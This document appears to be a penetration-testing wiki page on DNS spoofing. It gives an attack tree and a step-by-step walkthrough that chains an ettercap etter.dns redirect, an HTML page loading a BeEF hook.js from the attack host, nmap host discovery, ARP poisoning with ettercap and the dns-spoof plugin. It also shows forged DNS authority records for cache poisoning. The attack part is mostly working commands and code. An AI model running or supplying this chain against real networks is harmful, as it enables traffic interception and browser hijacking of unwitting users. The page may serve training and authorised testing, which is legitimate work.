# DNS spoofing

## Attack tree

```text
1 Hijack a local DNS (OR)
    1.1 Install malware on host
    1.2 Change local DNS settings for a redirect
2 Poison DNS cache (OR)
    2.1 Install a dns spoofing tool such as dns-spoof or ManOnTheSideAttack-DNS Spoofing (AND)
    2.2 Sniff the network traffic and intercept all DNS queries matching a given domain name from the victim (AND)
    2.3 Forge and send a valid response (the corrupt data gets cached by the DNS name server) (AND)
        2.3.1 Redirect the target domain's name server (cache an additional A-record for ns.target.example) (OR)
        2.3.2 Redirect the NS record to another target domain (cache unrelated authority information for target.example's NS-record)
    2.4 When the cache is poisoned (if it is a major DNS server, it can poison the caches of DNS servers 
    maintained by internet service providers), launch further attacks
3 Hijack a Router DNS (OR)
    3.1 Compromise router (AND) 
        3.1.1 Default passwords (OR)
        3.1.2 Use firmware vulnerabilities
    3.2 Overwrite DNS settings
4 Rogue DNS Server (OR)
    4.1 Compromise a DNS server (AND) 
    4.2 Change DNS records to redirect DNS requests
5 Use DNSSEC vulnerabilities
    5.1 Lack of data confidentiality (Sniff and use for further attacks)
    5.2 Misconfigured DNSSEC
    5.3 Zone enumeration (Only NSEC, NSEC3 and NSEC5 publish hashed records of hostnames)
```

## Examples

### DNS spoofing and cache poisoning

1. Modify the `/etc/ettercap/etter.dns` and add an entry to the file for the domain name "site.com" and have it point 
to the attack host.

```text
$ echo "site.com A <IP address attack host>" | sudo tee -a /etc/ettercap/etter.dns site.com A <IP address attack host>
```
2. Create a web page named `index.html` in the `/tmp` directory of the attack host to load a JavaScript BeEF hook 
using the BeEF `hook.js` file:

```html
<HTML>
    <HEAD>
        <script src="http://site.com:3000/hook.js"></script>
    </HEAD>
    <BODY>
        You have been hooked!
    </BODY>
</HTML>
```

This is the web page the user will be directed to when they try to connect to `site.com`.

3. Use either the Python http server module to host the web page on port 80, OR move the file to `/var/www/html/` 
and start the apache2 server.

```text
# python -m SimpleHTTPServer 80
# service apache2 start
```

4. Launch and login to BeEF
5. Open a second terminal and use Nmap to identify other hosts by just using ARP packets by specifying the `-sn` flag 
to disable port scanning and using the `-n` flag to stop IP address resolution: 

```text
# sudo nmap -n -sn <IP address attack host>/24
```

6. With a target host system found (<IP address target>) on the local network, find the gateway address for the local 
network using the `ip route` command:

```text
# ip route
```

7. Establish an ARP poisoning session between the local network gateway (<IP address gateway>) and the target 
(<IP address target>)

```text
# ettercap -M arp:remote -T -q /<IP address gateway>// /<IP address target>//
```

* The `-M` flag sets up for MiTM (on-path), using the remote arp technique. 
* The `-T` argument puts it in text-only mode. 
* The `-q` argument prevents Ettercap from printing the full packet contents, to make the output more readable. 
* The last part is the gateway and target in the format: `MAC address/IPv4 addresses/IPv6 addresses/Ports`. Not using 
the MAC adress, IPv6 adressess or ports explains the blanks and the slash delimiters.

8. Enable the DNS plugin. Type `p` to list the plugins. Choose the `dns-spoof` plugin. When it is active and the 
victim navigates to the web page `http://site.com/index.html`, they will see the spoofed and hooked page. Inside
the terminal with Ettercap, you can see the spoof succeed.
9. To exit Ettercap, press q.
10. In BeEF, see the target machine under the Online Browsers tab. From here, use BeEF to exploit the target further.

### Forging redirection records for poisoning

Redirect the target domain's name server (cache an additional A-record for ns.target.example:

```text
        +---------------------+
        | ANSWER              | (no response)
        +---------------------+
        | AUTHORITY           | adversary.example. 3600 IN NS ns.target.example.
        +---------------------+
        | ADDITIONAL          | ns.target.example. IN A xxx.xxx.xxx.xxx
        +---------------------+
```

Redirect the NS record to another target domain (cache unrelated authority information for target.example's NS-record):

```text
        +---------------------+
        | ANSWER              | (no response)
        +---------------------+
        | AUTHORITY           | target.example. 3600 IN NS ns.adversary.example.
        +---------------------+
        | ADDITIONAL          | ns.adversary.example. IN A xxx.xxx.xxx.xxx
        +---------------------+
```

## Notes

* DNS spoofing can be achieved by DNS redirection, an attack in which an adversary modifies a DNS server in order to 
redirect a specific domain name to a different IP address. In many cases, the new IP address will be for a server 
controlled by the adversary which contains files infected with malware. 
* Cache poisoning is another way to achieve DNS spoofing, without relying on DNS hijacking (physically taking over the 
DNS settings). An adversary inserts a forged DNS entry, containing an alternative IP destination for the same domain 
name, after which the DNS server resolves the domain to the spoofed website, until the cache is refreshed.
* DNS server spoofing attacks are often used to spread computer worms and viruses.
* This kind of attack is also often used for pharming.

## Tools

* [Ettercap](https://www.ettercap-project.org)
* [BeEF XSS](https://www.kali.org/tools/beef-xss/)

## Scripts

* [Hijack local DNS](https://github.com/tymyrddin/ymrir/tree/master/dns_spoofer)